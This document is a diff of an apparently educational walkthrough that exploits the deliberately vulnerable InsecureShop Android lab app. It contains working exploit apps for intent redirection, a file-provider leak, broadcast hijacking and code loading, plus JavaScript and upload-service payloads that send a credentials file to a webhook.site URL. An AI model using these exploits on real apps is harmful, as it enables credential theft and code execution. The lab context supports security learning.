+    // Waiting for any broadcast with this intent "com.insecureshop.action.BROADCAST"
+    registerReceiver(receiver, new IntentFilter("com.insecureshop.action.BROADCAST"));
+}
 }
 ```
 
@@ -728,28 +729,28 @@ So here the app is registering the Broadcast Receiver with the `com.insecureshop
 
 ```java
 public final class ProductDetailBroadCast extends BroadcastReceiver {
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        Intent webViewIntent = new Intent("com.insecureshop.action.WEBVIEW");
-        webViewIntent.putExtra("url", "https://www.insecureshopapp.com/");
-        if (context != null) {
-            context.startActivity(webViewIntent);
-        }
+@Override // android.content.BroadcastReceiver
+public void onReceive(Context context, Intent intent) {
+    Intent webViewIntent = new Intent("com.insecureshop.action.WEBVIEW");
+    webViewIntent.putExtra("url", "https://www.insecureshopapp.com/");
+    if (context != null) {
+        context.startActivity(webViewIntent);
     }
+}
 }
 ```
 
 When the broadcast is received, it will send the `URL` extra to load the `"https://www.insecureshopapp.com/"` URL as a WebView. Note that the extra `url` is being taken as a fixed value, so we can’t pass it with our intent. The next thought is, where is the `sendBroadcast` method being called to trigger this `onReceive` method? I have found it in the `com.insecureshop.ProductAdapter` class, and it is being triggered when the more info button is clicked.
 
 ```java
-       holder.getMBinding().moreInfo.setOnClickListener(new View.OnClickListener() { // from class: com.insecureshop.ProductAdapter$onBindViewHolder$3
-            @Override // android.view.View.OnClickListener
-            public final void onClick(View it) {
-                Intent intent = new Intent("com.insecureshop.action.PRODUCT_DETAIL");
-                intent.putExtra("url", ProductDetail.this.getUrl());
-                context.sendBroadcast(intent);
-            }
-        }); 
+holder.getMBinding().moreInfo.setOnClickListener(new View.OnClickListener() { // from class: com.insecureshop.ProductAdapter$onBindViewHolder$3
+    @Override // android.view.View.OnClickListener
+    public final void onClick(View it) {
+        Intent intent = new Intent("com.insecureshop.action.PRODUCT_DETAIL");
+        intent.putExtra("url", ProductDetail.this.getUrl());
+        context.sendBroadcast(intent);
+    }
+}); 
 ```
 
 The problem here is that there is no Intent extra data that we can control, all of them are hardcoded into the application. Here we have a registered broadcast receiver that is looking the action or waiting for the Intent filter with the value of `"com.insecureshop.action.PRODUCT_DETAIL"` in, which will be triggered as the more info button is clicked on the `ProductDetail` activity page. Then the `onReceive` method will be triggered to open the `"https://www.insecureshopapp.com"` URL in a WebView. 
@@ -795,24 +796,24 @@ And the most importantly is to add the `android:priority` attribute to the `Andr
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.insecureshopapp.productlistactivityexploit">
-    <application
-        android:allowBackup="true"
-        android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.ProductListActivityExploit">
-        <activity
-            android:name=".MainActivity"
-            android:exported="true">
-            <intent-filter android:priority="1000">
-                <action android:name="com.insecureshop.action.PRODUCT_DETAIL" />
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-    </application>
+package="com.insecureshopapp.productlistactivityexploit">
+<application
+android:allowBackup="true"
+android:icon="@mipmap/ic_launcher"
+android:label="@string/app_name"
+android:roundIcon="@mipmap/ic_launcher_round"
+android:supportsRtl="true"
+android:theme="@style/Theme.ProductListActivityExploit">
+<activity
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter android:priority="1000">
+        <action android:name="com.insecureshop.action.PRODUCT_DETAIL" />
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+</activity>
+</application>
 </manifest>
 ```
 
@@ -857,17 +858,17 @@ That means we have access to all files under `/` directory of the devices and th
 If you remember, we have discovered a vulnerability before that allowed us to access any protected component, and we’ve managed to access the `PrivateActivity` Component. Let’s review the vulnerable code again for `com.insecureshop.WebView2Activity`:
 
 ```java
-   public void onCreate(Bundle savedInstanceState) { 
-        super.onCreate(savedInstanceState);
-        setContentView(C0893R.layout.activity_webview);
-        setSupportActionBar((Toolbar) _$_findCachedViewById(C0893R.C0896id.toolbar));
-        setTitle(getString(C0893R.string.webview));
-        Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
-        if (extraIntent != null) {
-            startActivity(extraIntent);
-            finish();
-            return;
-        } 
+public void onCreate(Bundle savedInstanceState) { 
+    super.onCreate(savedInstanceState);
+    setContentView(C0893R.layout.activity_webview);
+    setSupportActionBar((Toolbar) _$_findCachedViewById(C0893R.C0896id.toolbar));
+    setTitle(getString(C0893R.string.webview));
+    Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
+    if (extraIntent != null) {
+        startActivity(extraIntent);
+        finish();
+        return;
+} 
 ```
 
 So we only need to pass the protected component along with the `extra_intent` parameter. Let’s craft our exploit app:
@@ -877,26 +878,26 @@ So we only need to pass the protected component along with the `extra_intent` pa
 ```java
 public class MainActivity extends AppCompatActivity {
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
 
-                // Once the WebView2Activity Start it will start for us the Activity2 from my app
-                // then access the content provider and get the content of the Prefs.xml file and add it to the Intent data
-                // finally in the Activity2 we will get the Intent Data and Log it
-        Intent FileProviderIntent = new Intent();
-        FileProviderIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-        FileProviderIntent.setClassName(getPackageName(), "com.insecureshopapp.protectedinsecureprovider.Activity2");
-        FileProviderIntent.setData(Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml"));
+    // Once the WebView2Activity Start it will start for us the Activity2 from my app
+    // then access the content provider and get the content of the Prefs.xml file and add it to the Intent data
+    // finally in the Activity2 we will get the Intent Data and Log it
+    Intent FileProviderIntent = new Intent();
+    FileProviderIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+    FileProviderIntent.setClassName(getPackageName(), "com.insecureshopapp.protectedinsecureprovider.Activity2");
+    FileProviderIntent.setData(Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml"));
 
-        // Start the Vulnerable Actvity
-        Intent WebView2Activity = new Intent();
-        WebView2Activity.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
-        WebView2Activity.putExtra("extra_intent", FileProviderIntent);
+    // Start the Vulnerable Actvity
+    Intent WebView2Activity = new Intent();
+    WebView2Activity.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
+    WebView2Activity.putExtra("extra_intent", FileProviderIntent);
 
-        startActivity(WebView2Activity);
-    }
+    startActivity(WebView2Activity);
+}
 }
 ```
 
@@ -904,35 +905,34 @@ public class MainActivity extends AppCompatActivity {
 
 ```java
 public class Activity2 extends AppCompatActivity {
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_2);
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_2);
+    try {
+        // Get the InputStream from the content URI provided by the Intent
+        InputStream inputStream = getContentResolver().openInputStream(getIntent().getData());
 
-        try {
-            // Get the InputStream from the content URI provided by the Intent
-            InputStream inputStream = getContentResolver().openInputStream(getIntent().getData());
-
-            // Convert InputStream to String and log it
-            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
-            StringBuilder stringBuilder = new StringBuilder();
-            String line;
-            while ((line = reader.readLine()) != null) {
-                stringBuilder.append(line).append("\n");
-            }
-            reader.close();
-
-            // Log the content of the file
-            Log.d("FileContent", stringBuilder.toString());
-
-        } catch (FileNotFoundException e) {
-            Log.e("FileContent", "File not found: " + e.getMessage());
-        } catch (IOException e) {
-            Log.e("FileContent", "Error reading file: " + e.getMessage());
+        // Convert InputStream to String and log it
+        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+        StringBuilder stringBuilder = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) {
+            stringBuilder.append(line).append("\n");
         }
+        reader.close();
+
+        // Log the content of the file
+        Log.d("FileContent", stringBuilder.toString());
+
+    } catch (FileNotFoundException e) {
+        Log.e("FileContent", "File not found: " + e.getMessage());
+    } catch (IOException e) {
+        Log.e("FileContent", "Error reading file: " + e.getMessage());
     }
-    }
+}
+}
 ```
 
 Let’s break down our code:
@@ -962,42 +962,42 @@ Let’s take a look at the provider class to see what we can get from it.
 
 ```java
 public final class InsecureShopProvider extends ContentProvider {
-    public static final Companion Companion = new Companion(null);
-    public static final int URI_CODE = 100;
-    private static UriMatcher uriMatcher;
+public static final Companion Companion = new Companion(null);
+public static final int URI_CODE = 100;
+private static UriMatcher uriMatcher;
 
-    @Override // android.content.ContentProvider
-    public boolean onCreate() {
-        UriMatcher uriMatcher2 = new UriMatcher(-1);
-        uriMatcher = uriMatcher2;
-        if (uriMatcher2 == null) {
-            return true;
-        }
-        uriMatcher2.addURI("com.insecureshop.provider", "insecure", 100);
+@Override // android.content.ContentProvider
+public boolean onCreate() {
+    UriMatcher uriMatcher2 = new UriMatcher(-1);
+    uriMatcher = uriMatcher2;
+    if (uriMatcher2 == null) {
         return true;
     }
+    uriMatcher2.addURI("com.insecureshop.provider", "insecure", 100);
+    return true;
+}
 
-    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
-        Intrinsics.checkParameterIsNotNull(uri, "uri");
-        UriMatcher uriMatcher2 = uriMatcher;
-        if (uriMatcher2 == null || uriMatcher2.match(uri) != 100) {
-            return null;
-        }
-        MatrixCursor cursor = new MatrixCursor(new String[]{"username", "password"});
-        String[] strArr = new String[2];
-        String username = Prefs.INSTANCE.getUsername();
-        if (username == null) {
-            Intrinsics.throwNpe();
-        }
-        strArr[0] = username;
-        String password = Prefs.INSTANCE.getPassword();
-        if (password == null) {
-            Intrinsics.throwNpe();
-        }
-        strArr[1] = password;
-        cursor.addRow(strArr);
-        return cursor;
+public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
+    Intrinsics.checkParameterIsNotNull(uri, "uri");
+    UriMatcher uriMatcher2 = uriMatcher;
+    if (uriMatcher2 == null || uriMatcher2.match(uri) != 100) {
+        return null;
     }
+    MatrixCursor cursor = new MatrixCursor(new String[]{"username", "password"});
+    String[] strArr = new String[2];
+    String username = Prefs.INSTANCE.getUsername();
+    if (username == null) {
+        Intrinsics.throwNpe();
+    }
+    strArr[0] = username;
+    String password = Prefs.INSTANCE.getPassword();
+    if (password == null) {
+        Intrinsics.throwNpe();
+    }
+    strArr[1] = password;
+    cursor.addRow(strArr);
+    return cursor;
+}
 }
 ```
 
@@ -1029,11 +1029,11 @@ Let’s review the `ResultActivity` code. First, note that this activity is an e
 Moving to its actual code:
 
 ```java
-   public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setResult(-1, getIntent());
-        finish();
-    }
+public void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setResult(-1, getIntent());
+    finish();
+}
 ```
 
 What the heck is `setResult()`?? I will ask ChatGPT because I didn’t understand it well from the documentation:
@@ -1043,46 +1043,46 @@ The `setResult()` method in Android is used in an activity to send a result back
 - **Start Activity for Result**: The first activity (let's call it Activity A) starts another activity (Activity B) and expects a result back. Activity A uses `startActivityForResult()` to start Activity B.
     
 ```java
-    // Activity A (First Activity):
-    Intent intent = new Intent(this, ActivityB.class);
-    startActivityForResult(intent, 1);  // Request code 1
+// Activity A (First Activity):
+Intent intent = new Intent(this, ActivityB.class);
+startActivityForResult(intent, 1);  // Request code 1
 ```
     
 - **Set the Result in the Second Activity**: In Activity B, you use `setResult()` to specify the result that should be returned to Activity A. This result can include data, or it can simply indicate that the action was successful or canceled.
 - **Finish the Second Activity**: After calling `setResult()`, Activity B usually calls `finish()` to close itself and return the result to Activity A.
     
 ```java
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_b);
-    
-        // Some operation and preparing the result
-        Intent resultIntent = new Intent();
-        resultIntent.putExtra("result_key", "Some Result Data");
-        
-        // Set result as OK and attach the data
-        setResult(RESULT_OK, resultIntent);
-    
-        // Finish this activity and return the result
-        finish();
-    }
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_b);
+
+    // Some operation and preparing the result
+    Intent resultIntent = new Intent();
+    resultIntent.putExtra("result_key", "Some Result Data");
+
+    // Set result as OK and attach the data
+    setResult(RESULT_OK, resultIntent);
+
+    // Finish this activity and return the result
+    finish();
+}
 ```
     
 - **Handle the Result in the First Activity**: When Activity B finishes, the system calls `onActivityResult()` in Activity A, where you can handle the returned result.
     
 ```java
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        
-        if (requestCode == 1) {  // Matching the request code
-            if (resultCode == RESULT_OK) {  // Result is OK
-                String result = data.getStringExtra("result_key");
-                // Handle the result
-            } else if (resultCode == RESULT_CANCELED) {
-                // Handle cancellation or no result
-            }
+protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+    super.onActivityResult(requestCode, resultCode, data);
+    
+    if (requestCode == 1) {  // Matching the request code
+        if (resultCode == RESULT_OK) {  // Result is OK
+            String result = data.getStringExtra("result_key");
+            // Handle the result
+        } else if (resultCode == RESULT_CANCELED) {
+            // Handle cancellation or no result
         }
     }
+}
 ```
     
 
@@ -1097,44 +1097,44 @@ We can use this to access the unexported content provider `com.insecureshop.file
 ```java
 public class MainActivity extends AppCompatActivity {
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        
-        Intent ResultActivityExploit = new Intent();
-        ResultActivityExploit.setClassName("com.insecureshop", "com.insecureshop.ResultActivity");
-        ResultActivityExploit.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-        Uri contentUri = Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");
-        ResultActivityExploit.setData(contentUri);
-        startActivityForResult(ResultActivityExploit, 1);
-    }
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    
+    Intent ResultActivityExploit = new Intent();
+    ResultActivityExploit.setClassName("com.insecureshop", "com.insecureshop.ResultActivity");
+    ResultActivityExploit.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+    Uri contentUri = Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");
+    ResultActivityExploit.setData(contentUri);
+    startActivityForResult(ResultActivityExploit, 1);
+}
+protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+    super.onActivityResult(requestCode, resultCode, data);
 
-            if (requestCode == 1 && resultCode == RESULT_OK) {
-                // Capture the returned data
-                Uri returnedUri = data.getData();
-                if (returnedUri != null) {
-                    // Access the content using the returned URI
-                    try {
-                        InputStream inputStream = getContentResolver().openInputStream(returnedUri);
-                        // Do something with the input stream, e.g., display or log the content
-                        // For example, read the input stream and print to screen
-                        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
-                        String line;
-                        StringBuilder result = new StringBuilder();
-                        while ((line = reader.readLine()) != null) {
-                            result.append(line).append("\n");
-                        }
-                        // Display the content on the screen
-                        Log.d("Data", result.toString());
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+    if (requestCode == 1 && resultCode == RESULT_OK) {
+        // Capture the returned data
+        Uri returnedUri = data.getData();
+        if (returnedUri != null) {
+            // Access the content using the returned URI
+            try {
+                InputStream inputStream = getContentResolver().openInputStream(returnedUri);
+                // Do something with the input stream, e.g., display or log the content
+                // For example, read the input stream and print to screen
+                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+                String line;
+                StringBuilder result = new StringBuilder();
+                while ((line = reader.readLine()) != null) {
+                    result.append(line).append("\n");
                 }
+                // Display the content on the screen
+                Log.d("Data", result.toString());
+            } catch (Exception e) {
+                e.printStackTrace();
             }
+        }
     }
+}
 }
 ```
 
@@ -1156,12 +1156,12 @@ Let’s search for the `OnReceived` method. We will find the `com.insecureshop.u
 ```java
 package com.insecureshop.util;
 public final class CustomWebViewClient extends WebViewClient {
-    @Override // android.webkit.WebViewClient
-    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
-        if (handler != null) {
-            handler.proceed();
-        }
+@Override // android.webkit.WebViewClient
+public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+    if (handler != null) {
+        handler.proceed();
     }
+}
 } 
 ```
 
@@ -1174,11 +1174,11 @@ Let’s break it down:
 So here we have a vulnerability that allows the user to load any URL, ignoring the SSL errors and accepting to load any invalid certificates. This will make the application’s user vulnerable to MITM attacks. To create a POC for this attack, we need to know where this custom `CustomWebViewClient` is being used. By searching through the code, the `com.insecureshop.WebViewActivity` class is using it: 
 
 ```java
-  public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(C0893R.layout.activity_webview);
-        webview.setWebViewClient(new CustomWebViewClient());
-        }
+public void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(C0893R.layout.activity_webview);
+    webview.setWebViewClient(new CustomWebViewClient());
+    }
 ```
 
 Luckily, we have previously exploited a vulnerability in this WebView class that allowed us to load any URL. So, to combine with the SSL misconfiguration here, we need to use an invalid certificate. We can simply run burpsuite proxy and browse any HTTPS website. In normal cases, the browser should return an error and not load the website. But in our case, the code here is built to ignore errors and continue browsing. Let’s exploit the webview activity to load the following HTTPS URL:
@@ -1207,40 +1207,40 @@ In the same class, `com.insecureshop.WebViewActivity` the `setAllowUniversalAcce
 <head>
 </head>
 <body>
-    <script type="text/javascript">
-        // Function to read the local file
-        function readLocalFile() {
-            // Create an XMLHttpRequest object
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml", true);
+<script type="text/javascript">
+    // Function to read the local file
+    function readLocalFile() {
+        // Create an XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml", true);
 
-            // Set up the callback to handle the file content
-            xhr.onload = function () {
-                // File content is in xhr.responseText
-                sendToServer(xhr.responseText);
-                document.write("Call sendToServer Function");
-            }
-            xhr.onerror = function () {
-                    document.write("Failed to read the file");
-                }
-            // Send the request
-            xhr.send();
-        };
-
-        // Function to send the file content to a remote server
-        function sendToServer(fileContent) {
-            var xhr = new XMLHttpRequest();
-            var serverUrl = "http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b/file?="+fileContent;
-            xhr.open("GET", serverUrl, true);
-            xhr.onerror = function(e) {
-                document.write("error again!!");
-                callback(null);
-            }
-            xhr.send();
+        // Set up the callback to handle the file content
+        xhr.onload = function () {
+            // File content is in xhr.responseText
+            sendToServer(xhr.responseText);
+            document.write("Call sendToServer Function");
         }
-        // Execute the function to read and exfiltrate the file
-        readLocalFile();
-    </script>
+        xhr.onerror = function () {
+                document.write("Failed to read the file");
+            }
+        // Send the request
+        xhr.send();
+    };
+
+    // Function to send the file content to a remote server
+    function sendToServer(fileContent) {
+        var xhr = new XMLHttpRequest();
+        var serverUrl = "http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b/file?="+fileContent;
+        xhr.open("GET", serverUrl, true);
+        xhr.onerror = function(e) {
+            document.write("error again!!");
+            callback(null);
+        }
+        xhr.send();
+    }
+    // Execute the function to read and exfiltrate the file
+    readLocalFile();
+</script>
 </body>
 </html>
 ```
@@ -1249,40 +1249,40 @@ Then we need to create an application that launches an Intent to exploit the `co
 
 ```java
 public class MainActivity extends AppCompatActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
 
-        try {
-            // Read the HTML file from the assets
-            BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(this.getAssets().open("ex.html")));
-            StringBuilder stringBuilder = new StringBuilder();
-            String line;
-            while ((line = reader.readLine()) != null) {
-                stringBuilder.append(line).append("\n");
-            }
-            reader.close();
-            String readfile = stringBuilder.toString();
-
-            // Create a new file on the external storage
-            File payload = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "ex.html");
-            Log.d("File", payload.toString());
-            // Write the content to the new file
-            FileOutputStream fos = new FileOutputStream(payload);
-            fos.write(readfile.getBytes());
-            fos.close();
-
-            // Start the vulnerable WebView activity
-            Intent webViewActivityIntent = new Intent("android.intent.action.VIEW");
-            webViewActivityIntent.setClassName("com.insecureshop", "com.insecureshop.WebViewActivity");
-            webViewActivityIntent.setData(Uri.parse("insecureshop://com.insecureshop/web?url=file://"+payload.toString()));
-            startActivity(webViewActivityIntent);
-
-        } catch (IOException e) {
-            e.printStackTrace();
+    try {
+        // Read the HTML file from the assets
+        BufferedReader reader = new BufferedReader(
+                new InputStreamReader(this.getAssets().open("ex.html")));
+        StringBuilder stringBuilder = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) {
+            stringBuilder.append(line).append("\n");
         }
+        reader.close();
+        String readfile = stringBuilder.toString();
+
+        // Create a new file on the external storage
+        File payload = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "ex.html");
+        Log.d("File", payload.toString());
+        // Write the content to the new file
+        FileOutputStream fos = new FileOutputStream(payload);
+        fos.write(readfile.getBytes());
+        fos.close();
+
+        // Start the vulnerable WebView activity
+        Intent webViewActivityIntent = new Intent("android.intent.action.VIEW");
+        webViewActivityIntent.setClassName("com.insecureshop", "com.insecureshop.WebViewActivity");
+        webViewActivityIntent.setData(Uri.parse("insecureshop://com.insecureshop/web?url=file://"+payload.toString()));
+        startActivity(webViewActivityIntent);
+
+    } catch (IOException e) {
+        e.printStackTrace();
+    }
 
     }
 }
@@ -1330,13 +1330,13 @@ At the beginning, you have to import this library into your code with by editing
 
 ```java
 dependencyResolutionManagement {
-    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-    repositories {
-        google()
-        mavenCentral()
-        maven { url 'https://jitpack.io' }
-        jcenter() // Warning: this repository is going to shut down soon
-    }
+repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+repositories {
+    google()
+    mavenCentral()
+    maven { url 'https://jitpack.io' }
+    jcenter() // Warning: this repository is going to shut down soon
+}
 }
 rootProject.name = "gotevUploadServiceExploit"
 include ':app'
@@ -1363,31 +1363,30 @@ import net.gotev.uploadservice.UploadFile;
 import net.gotev.uploadservice.UploadTaskParameters;
 
 public class MainActivity extends Activity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
 
-        UploadTaskParameters params = new UploadTaskParameters();
-        // Random Id parameter
-        params.setId("18888998");
-        
-        // Any Server URL to receive the local file
-        params.setServerUrl("http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b");
-        try {
-            params.addFile(new UploadFile("/data/data/com.insecureshop/shared_prefs/Prefs.xml"));
-            Intent intent = new Intent("net.gotev.uploadservice.action.upload");
-            intent.setClassName("com.insecureshop", "net.gotev.uploadservice.UploadService");
-            intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
-            intent.putExtra("multipartUtf8Charset", true);
-            intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
-            intent.putExtra("taskParameters", params);
-            startService(intent);
-        } catch (FileNotFoundException e) {
-            throw new IllegalStateException(e);
-        }
+    UploadTaskParameters params = new UploadTaskParameters();
+    // Random Id parameter
+    params.setId("18888998");
+    
+    // Any Server URL to receive the local file
+    params.setServerUrl("http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b");
+    try {
+        params.addFile(new UploadFile("/data/data/com.insecureshop/shared_prefs/Prefs.xml"));
+        Intent intent = new Intent("net.gotev.uploadservice.action.upload");
+        intent.setClassName("com.insecureshop", "net.gotev.uploadservice.UploadService");
+        intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
+        intent.putExtra("multipartUtf8Charset", true);
+        intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
+        intent.putExtra("taskParameters", params);
+        startService(intent);
+    } catch (FileNotFoundException e) {
+        throw new IllegalStateException(e);
     }
-
+}
 }
 ```
 
@@ -1406,20 +1405,20 @@ Actually, this vulnerability took me lots of time to discover where it arises, a
 I have found similar code in the `LoginActivity`
 
 ```java
- for (PackageInfo info : getPackageManager().getInstalledPackages(0)) {
-            String packageName = info.packageName;
-            Intrinsics.checkExpressionValueIsNotNull(packageName, "packageName");
-            if (StringsKt.startsWith$default(packageName, "com.insecureshopapp", false, 2, (Object) null)) {
-                try {
-                    Context packageContext = createPackageContext(packageName, 3);
-                    Intrinsics.checkExpressionValueIsNotNull(packageContext, "packageContext");
-                    Object value = packageContext.getClassLoader().loadClass("com.insecureshopapp.MainInterface").getMethod("getInstance", Context.class).invoke(null, this);
-                    Intrinsics.checkExpressionValueIsNotNull(value, "packageContext.classLoad…      .invoke(null, this)");
-                    Log.d("object_value", value.toString());
-                } catch (Exception e) {
-                    throw new RuntimeException(e);
-                }
-            }
+for (PackageInfo info : getPackageManager().getInstalledPackages(0)) {
+    String packageName = info.packageName;
+    Intrinsics.checkExpressionValueIsNotNull(packageName, "packageName");
+    if (StringsKt.startsWith$default(packageName, "com.insecureshopapp", false, 2, (Object) null)) {
+        try {
+            Context packageContext = createPackageContext(packageName, 3);
+            Intrinsics.checkExpressionValueIsNotNull(packageContext, "packageContext");
+            Object value = packageContext.getClassLoader().loadClass("com.insecureshopapp.MainInterface").getMethod("getInstance", Context.class).invoke(null, this);
+            Intrinsics.checkExpressionValueIsNotNull(value, "packageContext.classLoad…      .invoke(null, this)");
+            Log.d("object_value", value.toString());
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
 ```
 
 As the article describes, In this example, the vulnerable app obtains the ClassLoader of any app whose package begins with `com.insecureshopapp` and tries to find `com.insecureshopapp.MainInterface` and call its `getInterface` method. The danger is that an attacker can create their own app with a package name that begins with the right prefix, create the specified class with this method, and include in that method code that will then be executed in the context of the victim app. Let’s create our own app to exploit this vulnerability.
@@ -1440,25 +1439,25 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 public class MainInterface {
-    public static Object getInstance(Context context) {
-        // Malicious code to be executed
-        StringBuilder output = new StringBuilder();
-        try { 
-            ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", "whoami;ls /data/data/com.insecureshop/");
-            Process process = processBuilder.start();
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            String line;
-            while ((line = reader.readLine()) != null) {
-                output.append(line).append("\n");
-            }
-            process.waitFor();
-            Log.d("MainInterface", "Command Output: " + output.toString());
+public static Object getInstance(Context context) {
+    // Malicious code to be executed
+    StringBuilder output = new StringBuilder();
+    try { 
+        ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", "whoami;ls /data/data/com.insecureshop/");
+        Process process = processBuilder.start();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line).append("\n");
         }
-        catch (Exception e) {
-            return null;
-        }
+        process.waitFor();
+        Log.d("MainInterface", "Command Output: " + output.toString());
+    }
+    catch (Exception e) {
         return null;
     }
+    return null;
+}
 }
 ```
 
